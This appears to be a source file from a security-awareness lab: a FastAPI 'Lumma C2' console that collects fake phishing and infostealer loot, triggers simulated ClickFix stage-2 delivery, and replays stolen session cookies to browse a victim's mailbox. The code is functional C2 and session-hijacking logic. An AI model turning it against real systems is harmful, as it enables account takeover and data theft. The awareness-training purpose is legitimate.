"""Attacker C2 console — collects and displays stolen artifacts.

Receives:
  * phishing loot (stolen credentials / sessions / blocked passkey attempts)
  * infostealer exfiltration (browser profiles, cookies, wallets, …)
  * 'deploy' orders (ClickFix stage-2 payload delivery)

Everything is fake demo data. The console makes the attacker's perspective
visible for the awareness story: what does the criminal actually get?
"""
from __future__ import annotations

import sys
from pathlib import Path

_HERE = Path(__file__).resolve().parent
for _p in (_HERE, _HERE.parent):
    if str(_p) not in sys.path:
        sys.path.insert(0, str(_p))

import httpx
import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse, Response
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from common import config
from common.util import ROOT, JsonStore, now_iso, post_json, state_path, uid

templates = Jinja2Templates(directory=_HERE / "templates")
app = FastAPI(title="Lumma C2 (simulation)")
app.mount("/theme", StaticFiles(directory=ROOT / "common" / "static"), name="theme")

store = JsonStore(
    state_path("c2", "loot.json"),
    default={"sessions": [], "credentials": [], "webauthn": [], "exfil": [], "clickfix": []},
)


def _add(kind: str, payload: dict) -> None:
    def _do(data):
        payload["id"] = uid(10)
        data[kind].append(payload)

    store.update(_do)


@app.get("/healthz")
def healthz():
    return {"ok": True, "service": "c2"}


# ------------------------- loot intake -------------------------
@app.post("/api/loot")
async def loot(request: Request):
    body = await request.json()
    kind = body.get("kind")
    if kind == "session":
        _add("sessions", body)
    elif kind == "webauthn_relay_started":
        _add("webauthn", body)
    elif kind == "webauthn_blocked":
        _add("webauthn", body)
    else:
        _add("credentials", body)
    return {"ok": True, "id": body.get("id")}


@app.post("/gate.php")
async def gate(request: Request):
    """Lumma-style C2 gate endpoint for infostealer exfiltration."""
    body = await request.json()
    _add("exfil", {**body, "ts": now_iso()})
    return {"ok": True, "status": "received"}


@app.post("/api/clickfix/deploy")
async def clickfix_deploy(request: Request):
    """Trigger stage-2 on the endpoint simulator (simulated payload delivery)."""
    body = await request.json()
    r = post_json(
        f"{config.ENDPOINT_URL}/deploy",
        {"origin": body.get("origin", "clickfix"), "user": body.get("user", ""), "ts": now_iso()},
        timeout=8.0,
    )
    if not r or not r.get("ok"):
        return JSONResponse(
            {"ok": False, "error": (r or {}).get("error", "endpoint deploy failed")},
            status_code=502,
        )
    _add("clickfix", {**body, "status": "delivered", "ts": now_iso()})
    return {"ok": True}


# ------------------------- console UI -------------------------
@app.get("/", response_class=HTMLResponse)
def console(request: Request):
    data = store.data
    return templates.TemplateResponse(
        request,
        "console.html",
        {
            "request": request,
            "sessions": list(reversed(data.get("sessions", []))),
            "webauthn": list(reversed(data.get("webauthn", []))),
            "exfil": list(reversed(data.get("exfil", []))),
            "clickfix": list(reversed(data.get("clickfix", []))),
        },
    )


@app.get("/api/state")
def api_state():
    return {"ok": True, **store.data}


# ------------------------- stolen session proxy -------------------------
@app.get("/session/{sid}/mail", response_class=HTMLResponse)
def stolen_mail(sid: str):
    """Browse the victim's mailbox using the stolen session cookie."""
    data = store.data
    sess = next((s for s in data["sessions"] if s["id"] == sid), None)
    if not sess or not sess.get("cookie"):
        return HTMLResponse(
            "<h2>Session not found or expired</h2>", status_code=404
        )
    try:
        r = httpx.get(
            f"{config.PORTAL_URL}/mail",
            cookies={"nw_session": sess["cookie"]},
            headers={"user-agent": "Mozilla/5.0 (AttackerConsole; demo)"},
            timeout=10.0,
        )
    except httpx.HTTPError as e:
        return HTMLResponse(f"<h2>Relay error: {e}</h2>", status_code=502)
    if r.status_code != 200 or "/login" in str(r.url):
        return HTMLResponse(
            "<h2>Stolen session no longer valid</h2>", status_code=410
        )
    # Inject a base tag so relative links/assets still resolve against the portal
    html = r.text.replace(
        "<head>",
        "<head><base href='http://portal.localhost:8000/'>"
        "<style>body::before{content:'ATTACKER VIEW — stolen session';display:block;"
        "background:#ff5d5d;color:#0b1017;font:700 13px var(--sans);padding:6px;"
        "text-align:center;position:sticky;top:0;z-index:999}</style>",
        1,
    )
    return Response(html, media_type="text/html")


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=config.C2_PORT, log_level="warning")
